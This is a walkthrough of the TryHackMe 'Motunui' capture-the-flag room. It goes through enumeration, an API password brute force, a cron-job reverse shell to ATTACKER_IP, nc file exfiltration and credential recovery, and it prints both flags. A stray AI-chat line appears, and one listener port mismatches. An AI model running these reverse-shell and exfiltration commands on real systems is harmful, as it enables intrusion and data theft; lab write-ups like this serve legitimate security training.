---
cssclasses:
  - jbm-note
Date: 2026-05-27
tags:
  - THMChallenge
---
# Motunui Challenge

| **Target** :LiTarget:            | *Try hack me machine(room: motunui)* |
| -------------------------------- | ------------------------------------ |
| Date :LiCalendar:                | 27/5/2026                            |
| Main attack type                 | ...                                  |
| Secondary attack type            | ...                                  |
| Tools :LiToolCase:               | NMAP, GOBUSTER, WFUZZ, SMBMAP        |
| Criticality :RiAlarmWarningLine: | **...**                              |

---
# **RESULTS**
---
## Flags/Tasks
### Task 1
1. What is the user flag?
	- *THM{m0an4_0f_M0tunu1}*
2. What is the root flag?
	- *THM{h34rT_r35T0r3d}*

---
# Preparation
---
## Downloading software
- Cisco Packet Tracer

---
# Initial investigation/enumeration
---
## **Enumeration**
### NMAP
```bash
sudo nmap -sS -sV -O TARGET -oA nmap/nmap
```
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3000/tcp open  ppp?
5000/tcp open  ssl/http    Node.js (Express middleware)

Aggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 5.4 - 5.15 (90%), Linux 4.15 (88%), Crestron XPanel control system (86%), Android 10 - 12 (Linux 4.14 - 4.19) (85%), Linux 5.14 - 6.8 (85%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
```

## GOBUSTER
```bash
gobuster dir -u TARGET -w /usr/share/wordlists/dirb/big.txt  -o endpoints.txt
```
```
No intresting results...
```

```bash
gobuster dir -u http://d3v3lopm3nt.motunui.thm/ -w /usr/share/wordlists/dirb/common.txt -t 100 -q -o new_endpoints.txt
```
```
.htaccess            (Status: 403) [Size: 288]
.htpasswd            (Status: 403) [Size: 288]
.hta                 (Status: 403) [Size: 288]
docs                 (Status: 301) [Size: 333] [--> http://d3v3lopm3nt.motunui.thm/docs/]
index.php            (Status: 200) [Size: 248]
javascript           (Status: 301) [Size: 339] [--> http://d3v3lopm3nt.motunui.thm/javascript/]
server-status        (Status: 403) [Size: 288]
```

## SMBMAP
```Bash
smbmap -H TARGET -g initial.txt
```
```
host:TARGET, share:print$, privs:NO_ACCESS
host:TARGET, share:traces, privs:READ_ONLY
host:TARGET, share:IPC$, privs:NO_ACCESS
```

```Bash
smbmap -H 10.80.174.173 -r traces -g traces.txt
```
```
host:10.80.174.173, share:print$, privs:NO_ACCESS
host:10.80.174.173, share:traces, privs:READ_ONLY, isDir:d, path:traces//moana, fileSize:0, date:Wed Jul  8 23:50:12 2020
host:10.80.174.173, share:traces, privs:READ_ONLY, isDir:d, path:traces//maui, fileSize:0, date:Mon Aug  3 12:22:03 2020
host:10.80.174.173, share:traces, privs:READ_ONLY, isDir:d, path:traces//tui, fileSize:0, date:Wed Jul  8 23:50:40 2020
host:10.80.174.173, share:IPC$, privs:NO_ACCESS
```
## **Vulnerability scanning**
### Dictionary attacks
#### WFUZZ
```bash
wfuzz -w /usr/share/wordlists/rockyou.txt -c -H 'Content-Type: application/json'  
-d '{"username":"maui","password":"FUZZ"}' --hh 31 -t 50 http://api.motunui.thm:3000/v2/login
```

---
# Exploiting and  Investigation
---
## Port 80 $ Port 3000
Trying to enter the HTTP Apache server on port 80 only shows the default Apache page and trying to enumerate with **GOBUSTER** shows a `/hidden.html` page which just wastes time.

A Similar thing occurs with the NodeJS server on port 3000, where the server is not able to be accessed directly.

## SMPCLIENT
Using **SMPMAP** we can see that the `/traces` endpoint is available for sharing files. running SMBGET allows us to download all files in the `/traces` endpoint.

```bash
smbclient //TARGET/traces -N -c "prompt OFF; recurse ON; mget *"
```

This allows us to inspect a **`ticket_.pcap`** file found in the *`maui`* directory. Inspecting it reveals a **TCP** stream that contains a **`dashboard.png`** file that was transferred through **HTTP**. The file is a screenshot of a website with the URL : **`d3v3lopm3nt.motunui.thm`**.

## The development site

The screen shot contains the text "The pages included on this virtual host are solely for developers of Motunui. Please ensure you have authorisation to be viewing this.". This tells us that the website is only accessible through the domain **`d3v3lopm3nt.motunui.thm`**.

Adding the domain to `/etc/hosts` allows us to view the page.
```bash
echo "TARGET d3v3lopm3nt.motunui.thm" | sudo tee -a /etc/hosts
```

## Docs

Enumerating the website with GOBUSTER reveals the `/docs` endpoint which redirects to a `README.md` file. This file leads to other files including a `ROUTES.md` file which reveals how the API works. The file directly points out the virtual host domain **`api.motunui.thm:3000/v2/`**.

This allows us to test the login with random credentials. The response tells us that the backend is responding and since we can assume that there is no rate limiting we can run WFUZZ to brute force the password.

We eventually get the credentials:
```bash
curl -X POST -H "Content-Type: application/json" -d '{"username":"maui", "password":"island"}' http://api.motunui.thm:3000/v2/login
```
```json
{"hash":"aXNsYW5k"}
```

## Reverse shell

The previously gained hash allows us to be authenticated to interact with other parts of the API such as the `/jobs` endpoint. This will eventually allow us to get a reverse shell.

Reverse shell payload:
```bash
curl -H 'Content-Type: application/json' \
-d $'{"hash":"aXNsYW5k", "job":"* * * * * /bin/bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'"}' \
-X POST http://api.motunui.thm:3000/v2/jobs
```
```bash
nc -lnvp 4444
```

## SSH login

Manually enumerating with the reverse shell reveals two users, **`moana`** and *`network`*. The network user is simply a user for file sharing. The user moana on the other hand contains a file called `read_me` with text mentioning that the user is reusing her credentials:

```
I know you've been on vacation and the last thing you want is me nagging you.

But will you please consider not using the same password for all services? It puts us all at risk.

I have started planning the new network design in packet tracer, and since you're 'the best engineer this island has seen', go find it and finish it.
```

There is also a *`user.txt`* file that is not readable by the web server, however the credentials of the user can eventually be found through finding the packet tracer file which we can find in the *`/etc`* directory as **`/network.pkt`**.

>[!Note]
> The file requires the cisco packet tracer software.

We can analyze the file after using `nc` to transfer the file then using cisco packet tracer. Using cisco packet tracer and inspecting the switch leads to the users credentials when inspecting the config with the **`show running-config`** in the CLI.

### Cisco CLI step by step guide :

```
Step 1: Open the Switch Menu

1. Click directly on the **Switch icon** in your workspace topology.
2. A new window will pop up containing the switch settings.

Step 2: Switch to the CLI Tab

1. Look at the tabs along the top of the pop-up window.
2. Click on the tab labeled **CLI**.
3. Click inside the black text area and press **Enter** to activate the prompt.

Step 3: Enter Privileged Mode

1. Type `enable` and press **Enter**.
2. Look for the prompt change from `Switch>` to `Switch#`.

Step 4: Run the Configuration Command

1. Type `show running-config` (or simply `sh run`) and press **Enter**.
2. The switch will begin listing its active configuration file line by line.

Step 5: Navigate and Read the Output

1. Press the **Spacebar** to jump down one full page at a time.
2. Press the **Enter** key to scroll down one single line at a time.
3. Keep scrolling until you hit the end of the file, marked by the word `end`.

What **specific setting** are you looking for inside this configuration file? I can tell you **exactly what keyword** to scroll down and look for.
```
### Credentials:
```
username moana privilege 1 password 0 HOwF4ri'LLGO
```

>[!Tip]
>To transfer a file form a Linux target, the shortest method is using the **`tar`** command.
>On Target:
>```
>tar -czf - network.pkt | nc AttackerIP 1234
>```
>On Attacker
>```:
>nc -lnvp 443 > network_file.tar.gz
>```

After logging in to SSH, we can easily find the user flag in **`user.txt`**.

## Root access
The server is already susceptible to privilege escalation attacks, but a simpler method is to simply enumerate the site and inspect previously inaccessible elements. When enumerating through the server, there **HTTPS encryption** keys that were found in the `/etc` directory, We can use these keys to [decrypt **SSL traffic** in Wireshark](https://www.comparitech.com/net-admin/decrypt-ssl-with-wireshark/?source=post_page-----a73032b26705---------------------------------------). This allows us to inspect an HTTP request containing the root credentials.

```
Pl3aseW0rk
```